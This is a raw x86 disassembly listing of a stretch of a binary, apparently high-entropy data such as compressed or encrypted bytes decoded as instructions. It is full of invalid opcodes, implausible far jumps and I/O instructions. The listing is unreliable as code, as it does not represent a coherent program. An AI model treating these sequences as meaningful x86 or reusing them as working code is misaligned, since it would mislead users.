  41764b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41764c:	sub    ah,BYTE PTR [ecx+0x2233ad76]
  417652:	fadd   QWORD PTR [esi-0x13]
  417655:	pusha  
  417656:	add    DWORD PTR [esi-0x7c267fa9],ebx
  41765c:	cs loopne 0x4176dc
  41765f:	jno    0x4176a7
  417661:	sbb    eax,0xf7ffb16e
  417666:	(bad)  
  417667:	adc    eax,0xbf58d26f
  41766c:	gs xchg dh,bh
  41766f:	daa    
  417670:	push   eax
  417671:	cmp    ecx,DWORD PTR [ebx+0x1e]
  417674:	jmp    0xb41f3f6
  417679:	jbe    0x417624
  41767b:	stos   BYTE PTR es:[edi],al
  41767c:	pop    ecx
  41767d:	in     al,0xc0
  41767f:	pop    ebp
  417680:	sahf   
  417681:	pop    ds
  417682:	add    ebp,DWORD PTR [eax+0x4d69e03f]
  417688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417689:	je     0x417687
  41768b:	jo     0x4176be
  41768d:	aam    0xc0
  41768f:	adc    al,0xf2
  417691:	enter  0xc285,0x2a
  417695:	sub    al,0xf2
  417697:	push   esi
  417698:	imul   esp,DWORD PTR [edx+eax*1+0x5c],0x2e6fa14
  4176a0:	mov    edx,0xd7f468ee
  4176a5:	xchg   ebp,eax
  4176a6:	imul   ebx,ebx,0x73
  4176a9:	loopne 0x417727
  4176ab:	pop    esi
  4176ac:	jne    0x41765e
  4176ae:	shl    BYTE PTR [edx+0x77],0xcb
  4176b2:	add    eax,0x214ff9af
  4176b7:	sub    dl,0x74
  4176ba:	pushf  
  4176bb:	sar    ebp,1
  4176bd:	push   0xf406982c
  4176c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176c3:	(bad)  
  4176c4:	sbb    DWORD PTR [edx-0x296e1114],ecx
  4176ca:	mov    DWORD PTR [ebp+0x5c],eax
  4176cd:	adc    bh,BYTE PTR [ebx+0x3fc8d32d]
  4176d3:	jl     0x4176b7
  4176d5:	push   esi
  4176d6:	jno    0x4176a2
  4176d8:	inc    edi
  4176d9:	retf   
  4176da:	push   ds
  4176db:	mov    ebx,edx
  4176dd:	pop    edi
  4176de:	out    dx,al
  4176df:	aad    0xf1
  4176e1:	ja     0x41766b
  4176e3:	jb     0x41773c
  4176e5:	mov    cl,BYTE PTR [edx+0x6b]
  4176e8:	xor    al,0xdd
  4176ea:	ja     0x4176f5
  4176ec:	pop    eax
  4176ed:	and    DWORD PTR [eax+eiz*4-0x4b751224],edx
  4176f4:	sub    al,0xc0
  4176f6:	mov    ch,0xe7
  4176f8:	mov    ch,0xac
  4176fa:	loopne 0x417687
  4176fc:	xchg   ebx,eax
  4176fd:	retf   0x925a
  417700:	pushf  
  417701:	popf   
  417702:	jno    0x4176cc
  417704:	ficom  DWORD PTR [edi+0x31889955]
  41770a:	es dec edi
  41770c:	js     0x4176be
  41770e:	aas    
  41770f:	sbb    BYTE PTR [eax+0x1a],ah
  417712:	mov    esp,0x2f6e7cf
  417717:	adc    al,0xea
  417719:	push   edx
  41771a:	(bad)  
  41771b:	xchg   esp,eax
  41771c:	rcl    BYTE PTR [esi],0x7d
  41771f:	xchg   edi,eax
  417720:	gs sub eax,0xef20f2d1
  417726:	sbb    BYTE PTR [ecx],bh
  417728:	mov    ch,0xb9
  41772a:	or     DWORD PTR [edx],esp
  41772c:	xchg   esp,eax
  41772d:	pop    ecx
  41772e:	test   al,0xbc
  417730:	jmp    0x0:0xe9a02dd7
	...
  417793:	add    BYTE PTR [eax],al
  417795:	add    cl,ch
  417797:	push   cs
  417798:	(bad)  
  417799:	pop    ss
  41779a:	push   edi
  41779c:	jmp    0xebcb2f9f
  4177a1:	sbb    DWORD PTR [ecx+0x13],ebp
  4177a4:	mov    cl,0x99
  4177a6:	div    ebp
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    BYTE PTR [ecx+edx*1],ah
  4177b0:	xchg   edx,eax
  4177b1:	mov    esi,0x4ddc20fa
  4177b6:	mov    ecx,0x7601eece
  4177bb:	jns    0x417806
  4177bd:	(bad)  
  4177bf:	outs   dx,DWORD PTR ds:[esi]
  4177c0:	(bad)  
  4177c1:	mov    bh,0xfa
  4177c3:	push   0x2058d770
  4177c8:	sbb    BYTE PTR [edx+0x35],dh
  4177cb:	sub    bh,bh
  4177cd:	mov    esi,0xfe0e439c
  4177d2:	jecxz  0x417823
  4177d4:	xor    al,0xfe
  4177d6:	stos   BYTE PTR es:[edi],al
  4177d7:	sub    BYTE PTR [ebx-0x69],ah
  4177da:	clc    
  4177db:	pop    esi
  4177dc:	xor    al,BYTE PTR [esi]
  4177de:	(bad)  
  4177df:	fadd   DWORD PTR [ebx]
  4177e1:	not    DWORD PTR ds:0x69754aab
  4177e7:	imul   esp,DWORD PTR [ecx],0xfffffff5
  4177ea:	pop    eax
  4177eb:	cmp    DWORD PTR [edx-0x613518b0],0x4a8b7171
  4177f5:	jp     0x417846
  4177f7:	outs   dx,BYTE PTR ds:[esi]
  4177f8:	cld    
  4177f9:	arpl   WORD PTR [esi],dx
  4177fb:	scas   al,BYTE PTR es:[edi]
  4177fc:	inc    esp
  4177fd:	mov    bh,0x9d
  4177ff:	outs   dx,BYTE PTR ds:[esi]
  417800:	fld    TBYTE PTR [edx+0x52]
  417803:	pop    ebp
  417804:	shr    DWORD PTR [ebx+0x295457fa],cl
  41780a:	mov    bl,0x9e
  41780c:	adc    eax,0x6a370902
  417811:	repz pop ebp
  417813:	pop    esi
  417814:	test   DWORD PTR [ebx+ebx*2],eax
  417817:	mov    edx,0xb2bc9108
  41781c:	imul   BYTE PTR [edi-0xa]
  41781f:	mov    esi,0x867c1ae1
  417824:	pop    es
  417825:	fbstp  TBYTE PTR [ebp+0x43e8d3d]
  41782b:	mov    dl,0xc6
  41782d:	mov    bh,0x44
  41782f:	arpl   WORD PTR [ebx+0x23],ax
  417832:	cwde   
  417833:	jmp    0xcc74:0x56ad34cc
  41783a:	push   ss
  41783b:	faddp  st(0),st
  41783d:	fiadd  DWORD PTR [edi-0x4e255dc7]
  417843:	gs jmp 0xf2b5:0x6ee2676
  41784b:	cmc    
  41784c:	mov    edx,0xb9046154
  417851:	and    DWORD PTR [edi-0x31],ecx
  417854:	daa    
  417855:	popa   
  417856:	scas   al,BYTE PTR es:[di]
  417858:	ja     0x4177e6
  41785a:	fnstsw WORD PTR [edx]
  41785c:	mov    ds:0x96f9d17d,al
  417861:	call   0x6e07:0x630c4716
  417868:	xchg   BYTE PTR [ebx+0x25],ah
  41786b:	repz mov dl,0x95
  41786e:	pop    ebx
  41786f:	pop    esi
  417870:	ds mov ch,0x54
  417873:	outs   dx,DWORD PTR ds:[esi]
  417874:	jmp    0x1d8f9c85
  417879:	scas   al,BYTE PTR es:[edi]
  41787a:	popa   
  41787b:	nop
  41787c:	xchg   BYTE PTR [esi+0x6e56c938],dl
  417882:	sbb    dl,dl
  417884:	pop    eax
  417885:	jp     0x417809
  417887:	jecxz  0x4178f9
  417889:	push   edx
  41788a:	sahf   
  41788b:	fdivr  DWORD PTR [edi-0x499e5368]
  417891:	xchg   esi,eax
  417892:	stos   BYTE PTR es:[edi],al
  417893:	loope  0x41781c
  417895:	popf   
  417896:	sub    al,BYTE PTR [ebx]
  417898:	cld    
  417899:	gs mov edx,0x2aadd3a1
  41789f:	adc    eax,0x6957f54f
  4178a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178a5:	dec    ebx
  4178a6:	jge    0x417892
  4178a8:	(bad)  
  4178a9:	not    BYTE PTR [ecx+0x7b]
  4178ac:	(bad)
  4178af:	loope  0x41783e
  4178b1:	fmul   QWORD PTR [edi-0x2f]
  4178b4:	dec    eax
	...
  417915:	add    BYTE PTR [eax+0x41],bl
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0x8d60e3bb
  417923:	adc    al,cl
  417925:	push   0xfffffffe
  417927:	test   BYTE PTR [eax],0x0
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    ch,cl
  41792f:	adc    esp,DWORD PTR [edi+0x4fa524ba]
  417935:	aam    0x71
  417937:	(bad)  
  417938:	and    cl,al
  41793a:	icebp  
  41793b:	fld    TBYTE PTR [ebx]
  41793d:	lahf   
  41793e:	mov    WORD PTR [ecx],cs
  417940:	lods   al,BYTE PTR ds:[esi]
  417941:	test   al,0x4d
  417943:	mov    esi,0xbe509078
  417948:	push   es
  417949:	push   esp
  41794a:	loope  0x41797e
  41794c:	mov    ch,BYTE PTR [ebp-0x77f999e2]
  417952:	not    BYTE PTR ds:0xce771f55
  417958:	ficomp DWORD PTR [ebx]
  41795a:	push   0x11
  41795c:	mov    ebp,0x8e4eecb7
  417961:	add    ebx,DWORD PTR [eax-0x712a1fc8]
  417967:	xor    ecx,DWORD PTR [ecx-0x66379552]
  41796d:	inc    edx
  41796e:	sbb    BYTE PTR [eax*2+0x12a8d2f6],dh
  417975:	jle    0x41799a
  417977:	pop    es
  417978:	jle    0x41796f
  41797a:	call   0x95c4:0x97902a32
  417981:	aaa    
  417982:	ds jnp 0x417908
  417985:	sub    ah,bl
  417987:	ret    
  417988:	jp     0x417938
  41798a:	in     eax,0x9f
  41798c:	jo     0x41799e
  41798e:	in     eax,dx
  41798f:	add    cl,bl
  417991:	(bad)  
  417993:	inc    ebp
  417994:	push   edi
  417995:	ds stos DWORD PTR es:[edi],eax
  417997:	pop    ecx
  417998:	in     eax,0xaf
  41799a:	or     al,0xcf
  41799c:	cmp    dl,BYTE PTR [edi]
  41799e:	mov    ebx,0x320ee7cf
  4179a3:	ret    0x237f
  4179a6:	or     BYTE PTR [ebx-0x7a8c1080],0x97
  4179ad:	cld    
  4179ae:	cmp    esi,ebx
  4179b0:	cmp    BYTE PTR [ecx+eiz*8+0x37],ah
  4179b4:	xchg   BYTE PTR [edx-0x75],cl
  4179b7:	outs   dx,DWORD PTR ds:[esi]
  4179b8:	xchg   ecx,eax
  4179b9:	dec    esi
  4179ba:	xchg   edx,edx
  4179bc:	sub    ah,BYTE PTR [ebp+0x4d]
  4179bf:	dec    ebx
  4179c0:	int    0x72
  4179c2:	out    dx,al
  4179c3:	loope  0x4179dc
  4179c5:	and    DWORD PTR [eax+0x5571852a],esp
  4179cb:	ds dec ebp
  4179cd:	in     eax,dx
  4179ce:	mov    cl,0x32
  4179d0:	lods   eax,DWORD PTR ds:[esi]
  4179d1:	push   edx
  4179d2:	icebp  
  4179d3:	push   eax
  4179d4:	arpl   WORD PTR [esi],bp
  4179d6:	jl     0x4179b4
  4179d8:	add    DWORD PTR [ecx-0x5bc503be],0x3b
  4179df:	xor    BYTE PTR [ecx],bl
  4179e1:	mov    eax,0x6019aaa8
  4179e6:	out    0x6,eax
  4179e8:	mov    WORD PTR [esi+esi*2-0x19b4e616],fs
  4179ef:	jp     0x417987
  4179f1:	loope  0x417a56
  4179f3:	mov    ebx,0xc909b5c
  4179f8:	xor    DWORD PTR [edx+edx*4+0x58],edi
  4179fc:	std    
  4179fd:	test   ecx,0x8b219373
  417a03:	dec    edx
  417a04:	push   ds
  417a05:	out    0x3c,al
  417a07:	inc    ebp
  417a08:	inc    esp
  417a09:	lods   al,BYTE PTR ds:[esi]
  417a0a:	sbb    al,0x8c
  417a0c:	ins    BYTE PTR es:[edi],dx
  417a0d:	test   eax,0xd1b05902
  417a12:	sub    DWORD PTR [ecx+ebp*4],edi
  417a15:	mov    ds:0x370abf40,eax
  417a1a:	cwde   
  417a1b:	dec    ebx
  417a1c:	in     eax,dx
  417a1d:	aam    0x93
  417a1f:	aaa    
  417a20:	test   edx,ebx
  417a22:	cmp    al,0xd9
  417a24:	fwait
  417a25:	and    BYTE PTR [ebp-0x3438375c],al
  417a2b:	outs   dx,DWORD PTR ds:[esi]
  417a2c:	mov    al,ds:0x788e8b20
  417a31:	cmp    BYTE PTR [edi+ecx*1],0xf9
	...
  417a95:	add    BYTE PTR [edi],ch
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx+0x9]
  417aa3:	jns    0x417aa0
  417aa5:	xchg   esp,eax
  417aa6:	add    eax,0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    BYTE PTR [eax+0x5e],ah
  417ab0:	pop    ds
  417ab1:	push   eax
  417ab2:	pop    esp
  417ab3:	or     DWORD PTR [edx+0x261cc225],eax
  417ab9:	bound  eax,QWORD PTR [esi+0x7c2f4c21]
  417abf:	dec    ebp
  417ac0:	mov    ds:0xda4ab399,al
  417ac5:	test   al,0x6c
  417ac7:	(bad)  
  417ac8:	in     al,dx
  417ac9:	sbb    ebp,DWORD PTR ds:0xc9758429
  417acf:	cmp    al,0xca
  417ad1:	sbb    DWORD PTR [ecx+0x6903e5f3],edi
  417ad7:	push   cs
  417ad8:	es cmp eax,0x1e632c20
  417ade:	or     eax,0x723f8984
  417ae3:	pop    edi
  417ae4:	inc    eax
  417ae5:	in     eax,dx
  417ae6:	dec    ebp
  417ae7:	retf   
  417ae8:	and    bh,BYTE PTR [edi+edx*4]
  417aeb:	xchg   edx,eax
  417aec:	xor    DWORD PTR [edi-0x2e],esi
  417aef:	pop    edi
  417af0:	mov    esi,esi
  417af2:	cmp    DWORD PTR [eax+edi*1],eax
  417af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417af6:	mov    al,ds:0xc33a9ce0
  417afb:	push   ds
  417afc:	mov    dh,0xf2
  417afe:	sar    BYTE PTR [esp+eax*8],1
  417b01:	mov    BYTE PTR [edx+eax*4-0x2c],cl
  417b05:	ins    DWORD PTR es:[edi],dx
  417b06:	scas   al,BYTE PTR es:[edi]
  417b07:	dec    eax
  417b08:	inc    ebx
  417b09:	cmp    al,BYTE PTR [edi-0x55deec1]
  417b0f:	shr    al,1
  417b11:	sub    DWORD PTR [esi+0x45],ebp
  417b14:	in     eax,0x3b
  417b16:	xchg   BYTE PTR [esi+0x14],al
  417b19:	dec    edx
  417b1a:	pop    sp
  417b1c:	fisttp WORD PTR [esi-0x7220b012]
  417b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b23:	jmp    0x78adf877
  417b28:	int    0x97
  417b2a:	cs ret 
  417b2c:	sti    
  417b2d:	xor    al,0x45
  417b2f:	cwde   
  417b30:	sar    DWORD PTR [ebx+0x65d487ae],0xdc
  417b37:	pop    ebp
  417b38:	inc    edx
  417b39:	xor    BYTE PTR [esi*4-0x213dcafb],0x5a
  417b41:	mov    ebp,0xb3aed867
  417b46:	cdq    
  417b47:	add    BYTE PTR [edx+0x55],0xab
  417b4b:	in     eax,dx
  417b4c:	test   DWORD PTR [esi],ebx
  417b4e:	dec    esi
  417b4f:	js     0x417af0
  417b51:	sub    esi,ebp
  417b53:	inc    ebx
  417b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b55:	xor    DWORD PTR [ecx+eiz*4+0x4813c6e4],0xffffffd9
  417b5d:	push   edx
  417b5e:	sbb    eax,0x2c12ae17
  417b63:	(bad)  
  417b64:	repnz pop edi
  417b66:	adc    esi,ecx
  417b68:	push   ss
  417b69:	adc    al,0x3
  417b6b:	mov    cl,0x5b
  417b6d:	mov    cl,0x9b
  417b6f:	outs   dx,DWORD PTR ss:[esi]
  417b71:	fldcw  WORD PTR [edx+0x6e]
  417b74:	test   BYTE PTR [edi-0x5d],0x2a
  417b78:	js     0x417b18
  417b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b7b:	jge    0x417b2d
  417b7d:	pushf  
  417b7e:	ins    BYTE PTR es:[edi],dx
  417b7f:	add    DWORD PTR [edi-0x5d79bba3],ebx
  417b85:	inc    ebp
  417b86:	jo     0x417bb8
  417b88:	jo     0x417bc1
  417b8a:	xor    BYTE PTR [ebx-0x7e],dh
  417b8d:	pop    edi
  417b8e:	jecxz  0x417bc3
  417b90:	adc    al,0xf4
  417b92:	test   al,0x76
  417b94:	mov    esp,0x3993fca5
  417b99:	cmp    cl,cl
  417b9b:	push   es
  417b9c:	(bad)  
  417b9d:	icebp  
  417b9e:	in     al,dx
  417b9f:	and    al,0x8d
  417ba1:	and    DWORD PTR ds:0x49662d5b,ebp
  417ba7:	mov    al,ds:0xf84e5870
  417bac:	add    ecx,DWORD PTR ds:0x917fe76d
  417bb2:	int3   
  417bb3:	mov    ecx,0x10
	...
  417c14:	add    BYTE PTR [eax],al
  417c16:	mov    eax,eax
  417c18:	nop
  417c19:	test   cl,bl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0xaa
  417c23:	push   0xffffffa8
  417c25:	in     eax,0xc
  417c27:	stc    
  417c28:	add    BYTE PTR [eax],al
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [edx-0x2061b79c],cl
  417c33:	add    BYTE PTR [ebx-0x293f1bf4],ah
  417c39:	jns    0x91357264
  417c3f:	in     al,0x17
  417c41:	xchg   DWORD PTR [eax-0x71f23cb2],edi
  417c47:	arpl   WORD PTR [edi+0x33e57814],bp
  417c4d:	xor    al,BYTE PTR [esi]
  417c4f:	cmp    al,0x5
  417c51:	je     0x417c93
  417c53:	rcl    edi,cl
  417c55:	frstor [ecx+ebx*2]
  417c58:	test   eax,0xacc8b8e3
  417c5d:	dec    ebp
  417c5e:	inc    esi
  417c5f:	lahf   
  417c60:	add    eax,0x7277ba04
  417c65:	nop
  417c66:	pop    ebx
  417c67:	jmp    0xb57cea6
  417c6c:	dec    ecx
  417c6d:	mov    ch,0x6d
  417c6f:	lea    esi,[esi]
  417c71:	enter  0x5bee,0x9f
  417c75:	addr16 addr16 mov cl,0x73
  417c79:	cmp    DWORD PTR [ebp-0x5850db1d],esi
  417c7f:	icebp  
  417c80:	push   esi
  417c81:	and    DWORD PTR [ebp+eiz*8-0xc],esp
  417c85:	and    al,0x97
  417c87:	sbb    eax,0xabf1ee2c
  417c8c:	add    DWORD PTR [esi],ebx
  417c8e:	sahf   
  417c8f:	test   eax,0x17a6aea3
  417c94:	mov    cl,0xc2
  417c96:	push   edx
  417c97:	iret   
  417c98:	or     DWORD PTR [edi+0x13],ebp
  417c9b:	(bad)  [ecx]
  417c9d:	sub    al,0x42
  417c9f:	dec    ebx
  417ca0:	xor    al,0x23
  417ca2:	dec    ebp
  417ca3:	cmp    DWORD PTR [ebp-0x4298eb82],edx
  417ca9:	add    eax,0x7bcca1c4
  417cae:	and    BYTE PTR [ebp-0x15b53b2d],al
  417cb4:	fwait
  417cb5:	(bad)
  417cb9:	inc    ecx
  417cba:	and    al,0xef
  417cbc:	arpl   WORD PTR [ebx],dx
  417cbe:	cmp    DWORD PTR [ebx],edx
  417cc0:	and    al,ch
  417cc2:	xchg   esi,eax
  417cc3:	(bad)  [ebp+0x4016f515]
  417cc9:	mov    edi,0x70e74293
  417cce:	push   esi
  417ccf:	ja     0x417d05
  417cd1:	(bad)  
  417cd2:	cli    
  417cd3:	out    0xed,eax
  417cd5:	popa   
  417cd6:	fiadd  DWORD PTR [ebx]
  417cd8:	adc    DWORD PTR [ebx+0x26],ebp
  417cdb:	mov    esp,0xa81d61b7
  417ce0:	cmp    al,0x12
  417ce2:	pop    eax
  417ce3:	div    esp
  417ce5:	jge    0x417d2e
  417ce7:	adc    al,BYTE PTR [esi+0x37]
  417cea:	imul   ebp,DWORD PTR [ebp+0x129a0c60],0xffffffd7
  417cf1:	and    eax,DWORD PTR [edi+edi*8+0x5a2999df]
  417cf8:	sbb    DWORD PTR [edx],edx
  417cfa:	mov    BYTE PTR [esi+0x7a],bl
  417cfd:	icebp  
  417cfe:	aas    
  417cff:	push   ss
  417d00:	or     edi,DWORD PTR ds:0xe16cae62
  417d06:	pop    ecx
  417d07:	push   edi
  417d08:	xchg   ebx,eax
  417d09:	or     eax,0xf4a1dfa5
  417d0e:	cdq    
  417d0f:	jns    0x417d7e
  417d11:	test   al,0x14
  417d13:	jl     0x417d3b
  417d15:	adc    dh,BYTE PTR [ebp+0x203e374]
  417d1b:	mov    al,ds:0x4e11c8a7
  417d20:	aad    0xe7
  417d22:	or     esp,DWORD PTR [edi]
  417d24:	mov    dl,0xbb
  417d26:	pop    esp
  417d27:	(bad)  
  417d28:	pop    esi
  417d29:	xchg   ebp,eax
  417d2a:	pop    esi
  417d2b:	dec    edx
  417d2c:	sbb    cl,BYTE PTR [ebx]
  417d2e:	and    esp,DWORD PTR [esi+ebx*4-0x46a4f9b5]
	...
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0xb4
  417da3:	imul   ebx,DWORD PTR [ebx+edx*1-0x6]
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    dl,dh
  417daf:	pop    ebx
  417db0:	mov    esi,fs
  417db2:	mov    bh,0x65
  417db4:	xlat   BYTE PTR ds:[ebx]
  417db5:	cmp    al,0xec
  417db7:	push   ebp
  417db8:	or     ecx,ebx
  417dba:	aam    0x39
  417dbc:	push   ebp
  417dbd:	dec    eax
  417dbe:	cmp    bl,BYTE PTR [ecx-0x71221947]
  417dc4:	arpl   WORD PTR [esp+ecx*2],sp
  417dc7:	into   
  417dc8:	outs   dx,DWORD PTR ds:[esi]
  417dc9:	dec    edx
  417dca:	sbb    DWORD PTR [edi],esp
  417dcc:	loopne 0x417d4f
  417dce:	in     eax,0xfe
  417dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dd1:	jle    0x417d58
  417dd3:	pop    esi
  417dd4:	scas   al,BYTE PTR es:[edi]
  417dd5:	shr    DWORD PTR [edi+0x40cb1607],1
  417ddb:	mov    edi,0x3f45c53e
  417de0:	jg     0x417dcc
  417de2:	(bad)  
  417de3:	ja     0x417df4
  417de5:	mov    al,0xfa
  417de7:	dec    esp
  417de8:	cmp    al,0x7f
  417dea:	cli    
  417deb:	add    ecx,DWORD PTR [edx]
  417ded:	or     BYTE PTR [eax],al
  417def:	outs   dx,DWORD PTR ds:[esi]
  417df0:	jb     0x417de4
  417df2:	sbb    ecx,ebp
  417df4:	inc    edi
  417df5:	push   ebp
  417df6:	mov    dh,0x91
  417df8:	(bad)  
  417df9:	add    bh,dl
  417dfb:	push   eax
  417dfc:	add    al,0x9c
  417dfe:	call   0x1d7b:0x3d0a5295
  417e05:	hlt    
  417e06:	push   ss
  417e07:	mov    ebp,DWORD PTR [edi-0x4bf19e3d]
  417e0d:	stos   DWORD PTR es:[edi],eax
  417e0e:	xchg   esi,eax
  417e0f:	sbb    BYTE PTR [ecx],cl
  417e11:	jae    0x417df7
  417e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e14:	aaa    
  417e15:	cmp    DWORD PTR [ebx-0x7c],esp
  417e18:	mov    eax,ds:0x10815fd
  417e1d:	sbb    BYTE PTR [edi-0x66],dl
  417e20:	sub    esi,DWORD PTR ds:0x5d41dc61
  417e26:	and    BYTE PTR [edi-0xa],dh
  417e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e2a:	adc    ah,bh
  417e2c:	mov    dh,BYTE PTR [edx+0xd]
  417e2f:	push   esi
  417e30:	push   ds
  417e31:	mov    edi,edx
  417e33:	pop    eax
  417e34:	jmp    0x417e00
  417e36:	sbb    ecx,DWORD PTR [ebp-0xd]
  417e39:	mov    bl,0xd3
  417e3b:	mov    BYTE PTR [edx+edi*1-0x4f],bh
  417e3f:	jl     0x417eaf
  417e41:	ins    BYTE PTR es:[edi],dx
  417e42:	test   DWORD PTR [eax+0x73],esi
  417e45:	ss inc esp
  417e47:	push   cs
  417e48:	repz fmul QWORD PTR [eax+0x24a0bdb2]
  417e4f:	ror    BYTE PTR [ebp+0x29],0xaf
  417e53:	sar    BYTE PTR [esi+0x20d31bd0],cl
  417e59:	and    eax,0xf98e2a33
  417e5e:	mov    ecx,0xbbb7e36b
  417e63:	mov    WORD PTR [esi+esi*1+0x4f],cs
  417e67:	mov    ch,0xda
  417e69:	(bad)  
  417e6b:	mov    ch,0x82
  417e6d:	xrelease mov DWORD PTR [ebp-0xd],esp
  417e71:	dec    edx
  417e72:	xchg   esi,eax
  417e73:	cdq    
  417e74:	les    esp,FWORD PTR [esi+0x5cd02ae3]
  417e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e7b:	sub    al,0xca
  417e7d:	mov    ecx,0xa37ca198
  417e82:	mov    edx,esp
  417e84:	test   eax,0x2335bfc
  417e89:	mov    cl,0xac
  417e8b:	ins    DWORD PTR es:[edi],dx
  417e8c:	pop    edi
  417e8d:	sub    bl,0x5c
  417e90:	aad    0xac
  417e92:	jecxz  0x417ecf
  417e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e95:	dec    ebp
  417e96:	and    ecx,ecx
  417e98:	hlt    
  417e99:	icebp  
  417e9a:	inc    esi
  417e9b:	in     eax,0xd0
  417e9d:	xor    bl,BYTE PTR [eax-0x39075fce]
  417ea3:	xor    bh,BYTE PTR [edi+0x57af4e5d]
  417ea9:	adc    dh,dl
  417eab:	in     al,dx
  417eac:	(bad)  
  417ead:	enter  0x9a18,0xd7
  417eb1:	sub    al,0x8
  417eb3:	mov    WORD PTR [eax+eax*1+0x0],es
	...
  417f16:	(bad)  
  417f17:	out    0xe6,al
  417f19:	cmp    esp,esi
  417f1b:	cmp    edi,edi
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	and    BYTE PTR ds:0xfb1ad2fc,ch
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    bh,dh
  417f2f:	jmp    0x417f68
  417f31:	and    eax,0xec893950
  417f36:	mov    ebx,0x4509d609
  417f3b:	and    DWORD PTR [ebp+eiz*2-0xf86778d],0xffffffe1
  417f43:	das    
  417f44:	jge    0x417f83
  417f46:	push   ss
  417f47:	frstor [edi+ebp*1]
  417f4a:	xor    al,0xdb
  417f4c:	pop    ecx
  417f4d:	jae    0x417fa6
  417f4f:	lods   eax,DWORD PTR ds:[esi]
  417f50:	mov    esi,0xdb7858b5
  417f55:	mov    eax,ds:0xdc6a4d2b
  417f5a:	pop    es
  417f5b:	xor    eax,0x2997ce90
  417f60:	call   0x7ec6:0xe5caa0a3
  417f67:	(bad)  
  417f68:	in     al,dx
  417f69:	pop    esi
  417f6a:	or     eax,0x32834be1
  417f6f:	adc    DWORD PTR ds:0x506b49c7,esp
  417f75:	rcl    DWORD PTR [edx+0x306aa025],0xea
  417f7c:	or     al,0x21
  417f7e:	lahf   
  417f7f:	inc    esi
  417f80:	xchg   edx,eax
  417f81:	std    
  417f82:	and    DWORD PTR [edi],ebx
  417f84:	(bad)  
  417f85:	fisttp QWORD PTR [eax+0x1bd44102]
  417f8b:	adc    DWORD PTR [edi+0x5a],edi
  417f8e:	or     edx,DWORD PTR [eax]
  417f90:	pop    eax
  417f91:	shl    BYTE PTR [edx+ecx*4+0x2b],0xe4
  417f96:	pop    ecx
  417f97:	lahf   
  417f98:	ret    
  417f99:	fimul  WORD PTR [ecx-0x5b]
  417f9c:	jno    0x418007
  417f9e:	xchg   ebp,eax
  417f9f:	pop    esi
  417fa0:	fisttp WORD PTR [ebp-0x3636a0e8]
  417fa6:	es jge 0x417fe7
  417fa9:	(bad)  
  417faa:	xchg   ecx,eax
  417fab:	lahf   
  417fac:	je     0x417f84
  417fae:	cmp    DWORD PTR [ecx+ebp*8+0x44c47239],0x4d5b9a14
  417fb9:	daa    
  417fba:	ss inc edi
  417fbc:	or     eax,DWORD PTR [edi-0x51]
  417fbf:	imul   esi,DWORD PTR [ecx+0x3a],0xe95e5532
  417fc6:	dec    edi
  417fc7:	cmp    al,0x18
  417fc9:	ret    
  417fca:	lods   eax,DWORD PTR ds:[esi]
  417fcb:	add    DWORD PTR [ebp-0x27],0x2e
  417fcf:	or     esi,DWORD PTR [ebp+0x3d]
  417fd2:	push   0x2a
  417fd4:	ins    BYTE PTR es:[edi],dx
  417fd5:	je     0x417fb1
  417fd7:	adc    al,0x7a
  417fd9:	adc    eax,0xfffffff1
  417fdc:	(bad)  
  417fdd:	in     eax,0xc6
  417fdf:	retf   
  417fe0:	pusha  
  417fe1:	pop    ebx
  417fe2:	dec    ebx
  417fe3:	jmp    0x956a9c05
  417fe8:	dec    ecx
  417fe9:	loope  0x417f7b
  417feb:	loope  0x417f74
  417fed:	push   esi
  417fee:	test   eax,0x9c8466c7
  417ff3:	xor    ebx,ecx
  417ff5:	xor    al,0xd5
  417ff7:	pop    edi
  417ff8:	cmc    
  417ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ffa:	or     eax,0x562d050f
  417fff:	addr16 stc 
  418001:	sti    
  418002:	mov    ds:0x2041425e,al
  418007:	in     eax,0x62
  418009:	add    al,0x43
  41800b:	lock jno 0x417ff4
  41800e:	imul   edx,DWORD PTR [esi],0xffffffa6
  418011:	mov    bh,0x2d
  418013:	pusha  
  418014:	push   esi
  418015:	cmp    BYTE PTR [ecx-0x64],ch
  418018:	push   ds
  418019:	sar    esi,cl
  41801b:	(bad)  
